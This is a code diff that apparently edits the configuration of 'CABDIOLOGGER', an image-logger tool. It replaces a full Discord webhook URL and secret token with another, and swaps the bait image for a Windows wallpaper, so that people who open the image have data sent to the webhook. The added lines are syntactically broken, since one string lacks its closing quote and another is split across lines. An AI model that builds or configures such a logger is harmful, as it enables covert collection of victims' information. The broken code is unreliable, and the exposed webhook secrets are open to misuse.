@@ -10,8 +10,9 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "webhook": "https://discord.com/api/webhooks/1452409685956231289/nz_S0flTmASy2XO0XswoM9SwoFiQjKA4Zc7Z9BWtjZegoSfX4EuTSzwZH2i8l5GS8JY5,
+    "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/4208828f-619a-40a0-beed-3e09e819ceb7/dgj33e0-f1ae08c0-c5c5-4ee4-b8db-ee2d38ad46c9.jpg/v1/fill/w_1024,h_576,q_75,strp/microsoft_windows_bliss_11_wallpaper_4k_by_karara160_dgj33e0-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NTc2IiwicGF0aCI6IlwvZlwvNDIwODgyOGYtNjE5YS00MGEwLWJlZWQtM2UwOWU4MTljZWI3XC9kZ2ozM2UwLWYxYWUwOGMwLWM1YzUtNGVlNC1iOGRiLWVlMmQzOGFkNDZjOS5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.dHnT8N6NhGtC7YYBAxa7bPpumphdlOIIoVlnut-k1uQ
+    ", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
